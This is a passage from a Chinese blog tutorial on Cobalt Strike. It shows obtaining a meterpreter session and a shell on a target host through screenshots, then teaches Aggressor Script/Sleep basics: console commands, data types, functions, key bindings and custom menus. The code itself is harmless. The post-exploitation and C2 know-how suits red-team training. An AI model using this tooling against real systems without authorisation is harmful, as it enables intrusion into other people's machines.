+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636280011856-719c4b94-f8ab-42c4-9ea1-a30901b42ff4.png" alt="img"></p>
+<p>此时拿到meterpreter。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636281160088-4a71ea19-4ccf-42fb-9fa3-1d854c79da17.png" alt="img"></p>
+<p>输入shell，进入主机命令操作。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636281199848-c2984472-d7e8-4447-a2ee-506020e771b1.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636281218696-07c55f31-6b96-4d90-bd1e-0d1d9e28f490.png" alt="img"></p>
+<h1 id="八、Aggressor-Script"><a href="#八、Aggressor-Script" class="headerlink" title="八、Aggressor Script"></a>八、Aggressor Script</h1><h2 id="1、Sleep环境的搭建"><a href="#1、Sleep环境的搭建" class="headerlink" title="1、Sleep环境的搭建"></a>1、Sleep环境的搭建</h2><p>Aggressor Script：是C2 3.0以上版本的一个内置的脚本语言，他是由Sleep脚本解析，Sleep脚本目前国内是没有中文版本的，可能是因为使用的人不多</p>
+<p>Sleep语言下载地址：<a target="_blank" rel="noopener" href="http://sleep.dashnine.org/download/sleep.jar">http://sleep.dashnine.org/download/sleep.jar</a></p>
+<p>快速使用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar sleep.jar</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645023884055-4e37a027-4d05-4da6-a303-ad6f27e20a51.png" alt="img"></p>
+<p>输出hello world：新建一个cna文件，cna是Aggressor Scrip脚本的后缀，然后在里面写：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println(<span class="string">&quot;hello word&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后加载一下</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645026666779-2aad8305-bb07-4fc2-a9c3-ed3b52b2c667.png" alt="img"></p>
+<h2 id="2、简介"><a href="#2、简介" class="headerlink" title="2、简介"></a>2、简介</h2><p>在 C2 中，我们可以打开 Aggressor Script的控制台</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645027083954-3345d986-3bd4-440d-88c9-f431b2979f2b.png" alt="img"></p>
+<p>这里我们可以使用 help查看一些帮助信息：</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645027115541-153b2efc-bf59-4db5-aaf9-94fbf10f926b.png" alt="img"></p>
+<p>下面是介绍：</p>
+<h3 id="（1）？"><a href="#（1）？" class="headerlink" title="（1）？"></a>（1）？</h3><p>？进行一个简单的判断，返回值为True或者False，例如 <code>? int(1) == int(2)</code> 返回为False</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645027229763-1c78a3d9-f8b3-42ec-8201-ae532834010c.png" alt="img"></p>
+<h3 id="（2）e"><a href="#（2）e" class="headerlink" title="（2）e"></a>（2）e</h3><p>e 执行我们写的代码，相当于交互模式，如果不加上 <code>e</code> 的话是无法执行的，例如<code> e println(&quot;hello world&quot;)</code>：</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645027322238-5491815f-1d41-4e5e-90b8-77b982339cb7.png" alt="img"></p>
+<h3 id="（3）help"><a href="#（3）help" class="headerlink" title="（3）help"></a>（3）help</h3><p>这个就是显示帮助信息，我们在开头使用过</p>
+<h3 id="（4）load"><a href="#（4）load" class="headerlink" title="（4）load"></a>（4）load</h3><p>load加载cna脚本，这里我加载一个脚本：<code>load &lt;cna path&gt;</code></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645027586674-7811cc9d-7d69-4736-8cd1-7daa30c58975.png" alt="img"></p>
+<p>这里加载的 cna 内容为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">command w&#123;</span><br><span class="line">	println(<span class="string">&quot;hello world!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>意思是创建一个 command 名字为 w，当输入w的时候就打印hello word。</p>
+<h3 id="（5）ls"><a href="#（5）ls" class="headerlink" title="（5）ls"></a>（5）ls</h3><p>显示我们目前加载的cna代码</p>
+<h3 id="（6）proff"><a href="#（6）proff" class="headerlink" title="（6）proff"></a>（6）proff</h3><p>禁止cna脚本运行Sleep的语法（不明白具体的作用）</p>
+<h3 id="（7）profile"><a href="#（7）profile" class="headerlink" title="（7）profile"></a>（7）profile</h3><p>统计cna脚本使用了哪些Sleep语法</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645027862972-e7162504-fae9-49cb-ac5b-3d79641237e8.png" alt="img"></p>
+<h3 id="（8）pron"><a href="#（8）pron" class="headerlink" title="（8）pron"></a>（8）pron</h3><p>运行cna脚本运行Sleep的语法</p>
+<h3 id="（9）reload"><a href="#（9）reload" class="headerlink" title="（9）reload"></a>（9）reload</h3><p>重新加载cna脚本，还是用我刚刚的cna脚本举例，我先修改cna中的内容</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">command w&#123;</span><br><span class="line">	println(<span class="string">&quot;hello friend!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再到控制台输出一下</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645027976257-54ef3ca2-36c4-44b8-8810-80ec8c07c1ca.png" alt="img"></p>
+<p>没有改变，我再重载一下再运行</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645028013183-78a0902b-8602-4c09-9894-d13a0d4929a3.png" alt="img"></p>
+<h3 id="（10）troff"><a href="#（10）troff" class="headerlink" title="（10）troff"></a>（10）troff</h3><p>关闭函数跟踪，也就是我们不显示函数运行的具体情况</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645028095118-8ae92239-4472-47ea-8ce7-a19db16770d7.png" alt="img"></p>
+<h3 id="（11）tron"><a href="#（11）tron" class="headerlink" title="（11）tron"></a>（11）tron</h3><p>开启函数跟踪，显示我们运行时的具体情况</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645028141985-3eff0147-4458-41f3-85ce-d38b8aeb4afe.png" alt="img"></p>
+<p>发现我们运行的情况，在t1.cna的第二行，我们输出hello friend</p>
+<h3 id="（12）x"><a href="#（12）x" class="headerlink" title="（12）x"></a>（12）x</h3><p>执行一个计算，比如1 + 1什么的，这里需要注意，两个数字之间需要间隔开，不然会报错</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645028221816-3561ebe9-4430-4661-80d6-9d93c6867fcc.png" alt="img"></p>
+<h2 id="3、使用不带GUI的C2"><a href="#3、使用不带GUI的C2" class="headerlink" title="3、使用不带GUI的C2"></a>3、使用不带GUI的C2</h2><p>我们可以使用agscript 运行一个不使用GUI的C2客户端，简单来说就是命令行的操作</p>
+<p>服务器上启动后，在本地输入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./agscript [host] [port] [user] [password]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645028490112-c6de7f09-a05c-4b21-9630-f3544096b317.png" alt="img"></p>
+<h2 id="4、Sleep快速入门"><a href="#4、Sleep快速入门" class="headerlink" title="4、Sleep快速入门"></a>4、Sleep快速入门</h2><p>这是他的数据类型，首先我们要注意的是，他的格式是一定需要带上空格的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">数字</span><br><span class="line">字符串</span><br><span class="line">Arrays</span><br><span class="line">Lists</span><br><span class="line">Stacks</span><br><span class="line">Sets</span><br><span class="line">Hashs</span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;kris&quot;</span>; <span class="comment"># 字符串变量的命名</span></span><br><span class="line"><span class="variable">$age</span> = 18; <span class="comment"># 数字型变量命名</span></span><br><span class="line"></span><br><span class="line">Arrays类型：</span><br><span class="line">@user_list = @(<span class="string">&quot;kris&quot;</span>,18,<span class="string">&quot;四川&quot;</span>,<span class="string">&quot;单身&quot;</span>); <span class="comment"># Sleep的阵列（列表）是类似python的那种任何元素的集合，不需要元素的类型统一，即也是一种复合数据类型。</span></span><br><span class="line">println(@name_list[0]); <span class="comment"># 下标输出信息</span></span><br><span class="line"> </span><br><span class="line">Hashs类型</span><br><span class="line">%dict[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;kris&quot;</span>;</span><br><span class="line">%dict[<span class="string">&quot;age&quot;</span>] = 18;</span><br><span class="line">%dict[<span class="string">&quot;address&quot;</span>] = <span class="string">&quot;sichuan&quot;</span>; <span class="comment"># 使用%号创建，有点和python的字典类似</span></span><br><span class="line">    </span><br><span class="line">println(<span class="string">&quot;Dict is &quot;</span>.%dict);</span><br></pre></td></tr></table></figure>
+
+<h3 id="（1）Arrays"><a href="#（1）Arrays" class="headerlink" title="（1）Arrays"></a>（1）Arrays</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@arr1</span> = @(<span class="string">&#x27;a1&#x27;</span>,<span class="string">&#x27;a2&#x27;</span>,<span class="number">887</span>);</span><br><span class="line">println(<span class="meta">@arr1</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645029173232-1140027e-8ec2-4ae9-b315-91820ce10cad.png" alt="img"></p>
+<h3 id="（2）Hashs"><a href="#（2）Hashs" class="headerlink" title="（2）Hashs"></a>（2）Hashs</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$x = <span class="number">2</span>;</span><br><span class="line">%dic[<span class="string">&quot;key1&quot;</span>] = <span class="string">&quot;value1&quot;</span>;</span><br><span class="line">%dic[<span class="string">&quot;key2&quot;</span>] = <span class="string">&quot;value2&quot;</span>;</span><br><span class="line">%dic[$x] = <span class="string">&quot;value3&quot;</span>;</span><br><span class="line">println(<span class="string">&quot;%dic is&quot;</span>.%dic);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645030293107-79d019ff-69b8-48f6-b784-b616d8180dc8.png" alt="img"></p>
+<h3 id="（3）遍历"><a href="#（3）遍历" class="headerlink" title="（3）遍历"></a>（3）遍历</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@name_list</span> = @(<span class="string">&#x27;kris&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;sichuan&#x27;</span>);</span><br><span class="line">foreach $<span class="keyword">var</span> (<span class="meta">@name_list</span>)</span><br><span class="line">&#123;</span><br><span class="line">   println($<span class="keyword">var</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645030462150-6e5e5748-aab8-4a5c-8122-ae57635a2538.png" alt="img"></p>
+<h3 id="（4）Push"><a href="#（4）Push" class="headerlink" title="（4）Push"></a>（4）Push</h3><p>这个类似我们的Python中的append方法，在列表的最后面添加数据</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@names</span> = @(<span class="string">&quot;Hellen&quot;</span>,<span class="string">&quot;Abao&quot;</span>);</span><br><span class="line">push(<span class="meta">@names</span>,<span class="string">&quot;kris&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">println(<span class="string">&quot;name :&quot;</span>.<span class="meta">@names</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645030658019-4aa64654-b2f3-4aab-bf38-936459ee9cc3.png" alt="img"></p>
+<h3 id="（5）简单的交互程序"><a href="#（5）简单的交互程序" class="headerlink" title="（5）简单的交互程序"></a>（5）简单的交互程序</h3><p>首先先看代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sub say_hello&#123;</span><br><span class="line">	println(<span class="string">&quot;hello &quot;</span>.$<span class="number">1</span>);# 定义一个函数，打印hello + 得到的参数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">command N &#123;</span><br><span class="line">	say_hello($<span class="number">1</span>); # 定义一个命令，并且将接受到的第一个参数传递给 say_hello函数。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645030873259-02cc9f6d-464c-4939-9da0-9e421233b32f.png" alt="img"></p>
+<p>首先介绍定义函数的方式，在Sleep中，我们使用 sub 进行函数的定义，比如我们定义一个加法函数：  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sub add &#123;</span><br><span class="line">	<span class="keyword">return</span> $<span class="number">1.</span><span class="string">&quot;+&quot;</span>.$<span class="number">2.</span><span class="string">&quot;=&quot;</span>.($<span class="number">1</span> + $<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sum = add(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">println($sum);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645031053362-3bf0cf93-52fa-422e-8e1a-ab682794d5e6.png" alt="img"></p>
+<p>command定义命令 语法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">command &lt;你想要的命令&gt;</span><br><span class="line">	&#123;</span><br><span class="line">		执行的代码;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里是我们使用我们自定义的函数进行交互的，在上面我们是使用的 N 去执行 say_hello的函数体，我们现在只使用一个 command 起到相同的作用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">command N &#123;</span><br><span class="line">	println(<span class="string">&quot;hello &quot;</span>.$<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645031137918-d107582d-f525-4f41-87b1-5e428143c719.png" alt="img"></p>
+<p>这里说明，我们可以直接写函数，也可以调用<code>$1</code> 是我们接受到的第一个参数，以此类推：<code>$2</code>是第二个参数……</p>
+<h3 id="（6）彩色输出"><a href="#（6）彩色输出" class="headerlink" title="（6）彩色输出"></a>（6）彩色输出</h3><p>简单的来说就是让我们的控制台输出一个带颜色的字体：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">println(<span class="string">&quot;\c0This is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\c1This is my color&quot;</span>); # 这是黑色</span><br><span class="line">println(<span class="string">&quot;\c2This is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\c3This is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\c4This is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\c5This is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\c6This is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\c7This is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\c8This is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\c9This is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\cAThis is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\cBThis is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\cCThis is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\cDThis is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\cEThis is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\cFThis is my color&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645031250543-5bf6af5e-3c38-49b6-9dc0-966b6d15be25.png" alt="img"></p>
+<h2 id="5、键盘快捷键"><a href="#5、键盘快捷键" class="headerlink" title="5、键盘快捷键"></a>5、键盘快捷键</h2><p>语法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bind &lt;想绑定的组合键&gt;</span><br><span class="line">	&#123;</span><br><span class="line">		按下快捷键执行的命名;	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们绑定一个来试试看：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bind Ctrl+H &#123;</span><br><span class="line">	show_message(<span class="string">&quot;使用键盘快捷键哦！&quot;</span>); # 弹窗显示我们的消息</span><br><span class="line">	elog(<span class="string">&quot;使用了快捷键！&quot;</span>); # 在 Event Log位置显示信息</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645031692876-9bb0cccc-f3f1-4fb6-b3e7-d0efbf5cc08c.png" alt="img"></p>
+<p>当我们 按下 Ctrl + H 的组合键的时候，我们就直接弹出信息，并且按照代码一样在 Event log下输出，组合键可以随便写，你也可以只写一个 H，都是可以的，加上 Ctrl只是约定俗，也可以使用对个修饰符，比如 Ctrl + Shift + H。</p>
+<h2 id="6、菜单编写"><a href="#6、菜单编写" class="headerlink" title="6、菜单编写"></a>6、菜单编写</h2><p>菜单就是下面这样的东西：</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645031766771-6bd19f2a-1563-4567-b690-809194a9dd69.png" alt="img"></p>
+<p>我们可以自己定义想要的菜单或者将我们的二级菜单添加到已经存在的主菜单下，创建自定义菜单语法如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">popup &lt;菜单函数名&gt;&#123;</span><br><span class="line">	        item(<span class="string">&quot;&amp;&lt;二级菜单显示&gt;&quot;</span>, &#123;点击时执行的代码，或者函数&#125;); # 第一个子菜单</span><br><span class="line">        	separator(); #分割线</span><br><span class="line">        	item(<span class="string">&quot;&amp;&lt;二级菜单名字&gt;&quot;</span>, &#123;点击时执行的代码，或者函数&#125;); # 第二个子菜单</span><br><span class="line">        	separator(); #分割线</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">menubar(<span class="string">&quot;一级菜单显示名&quot;</span>, <span class="string">&quot;菜单函数名&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>我们现在定义一个简单的菜单</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">popup my_help&#123;</span><br><span class="line">	item(<span class="string">&quot;&amp;这是百度&quot;</span>,&#123;url_open(<span class="string">&quot;http://www.baidu.com&quot;</span>)&#125;);</span><br><span class="line">	separator();</span><br><span class="line">	item(<span class="string">&quot;&amp;这是谷歌&quot;</span>,&#123;url_open(<span class="string">&quot;http://www.google.com&quot;</span>)&#125;); # url_open()这个函数是用来打开网站的</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">menubar(<span class="string">&quot;帮助菜单&quot;</span>, <span class="string">&quot;my_help&quot;</span>); # 菜单函数，一定要加上</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645031945529-26ea5f68-9078-4933-91aa-91fb26ef11fb.png" alt="img"></p>
+<p>当我们点击以后，会直接打开百度的链接：</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645032019792-7b63a2a6-d429-4b95-ab8d-77e9531f6a23.png" alt="img"></p>
+<p>如果我们并不想创建新的菜单，而是想在默认的菜单上增加，我们可以这样做：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">popup help&#123;</span><br><span class="line">	item(<span class="string">&quot;&amp;关于汉化&quot;</span>,&#123;show_message(<span class="string">&quot;4.1汉化 by XXX &quot;</span>)&#125;);</span><br><span class="line">	separator();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645032063667-389bb402-fd98-4465-a61d-891019526f4a.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645032076155-209209e1-03f6-44af-aec8-02bdbf76b710.png" alt="img"></p>
+<p>这样我们就在与原有的基础上加上了一个关于汉化的提示，这里我们是加载外部的 cna ，你可以修改默认的 default.cna来添加自己的信息。</p>
+<p>除了上面说的那样的菜单，我们还会在点击右键的时候打开菜单，如下所示：</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645032144040-9a4bb477-8150-4d40-ba32-1337893d9ba4.png" alt="img"></p>
+<p>创建这样的菜单我们的语法为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popup beacon_bottom&#123;</span><br><span class="line">    	item(<span class="string">&quot;&amp;关于作者&quot;</span>, &#123; url_open(<span class="string">&quot;https://wolke.cn&quot;</span>); &#125;);</span><br><span class="line">        	&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645032211168-67575ebf-20d9-471c-b06e-6f8647c11a3e.png" alt="img"></p>
+<p>我们在任何的菜单里面都可以嵌套菜单，就整出一个多级菜单的样子，我们把上面的代码进行修改</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">popup beacon_bottom&#123;</span><br><span class="line">	menu <span class="string">&quot;关于作者&quot;</span>&#123;</span><br><span class="line">    	item(<span class="string">&quot;&amp;博客&quot;</span>, &#123; url_open(<span class="string">&quot;https://wolke.cn&quot;</span>); &#125;);</span><br><span class="line">		item(<span class="string">&quot;&amp;QQ&quot;</span>, &#123; show_message(<span class="string">&quot;xxxxxx&quot;</span>); &#125;);</span><br><span class="line">        	&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645032261949-b4185a91-1a20-483a-9806-8112c32528db.png" alt="img"></p>
+<p>多级菜单就是多了一个menu “右键显示的信息”{} 的写法，这里和上面菜单编写最大的区别就是没有menubar的写法，因为我们是直接在右键菜单上进行修改的，也就是原有菜单上修改</p>
+<h1 id="八、参考链接"><a href="#八、参考链接" class="headerlink" title="八、参考链接"></a>八、参考链接</h1><ul>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44677409/article/details/102725129">https://blog.csdn.net/weixin_44677409/article/details/102725129</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/255876.html">https://www.freebuf.com/articles/web/255876.html</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/359251293">https://zhuanlan.zhihu.com/p/359251293</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.mrwu.red/fenxiang/3673.html">https://www.mrwu.red/fenxiang/3673.html</a></p>
+</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">w01ke</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://wolke.cn/post/57d03e3e.html">https://wolke.cn/post/57d03e3e.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://wolke.cn" target="_blank">wolke</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CobaltStrike/">CobaltStrike</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><div class="post_share"><div class="social-share" data-image="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/icon.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/post/409cdb09.html"><img class="next-cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/SQLMap-Logo.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Sqlmap的--os-shell原理</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81CobaltStrike%E7%AE%80%E4%BB%8B"><span class="toc-text">一、CobaltStrike简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81CobaltStrike%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E5%90%AF%E5%8A%A8"><span class="toc-text">二、CobaltStrike的安装和启动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%AE%89%E8%A3%85java%E7%8E%AF%E5%A2%83"><span class="toc-text">1、安装java环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%AE%89%E8%A3%85CobalStrike"><span class="toc-text">2、安装CobalStrike</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span 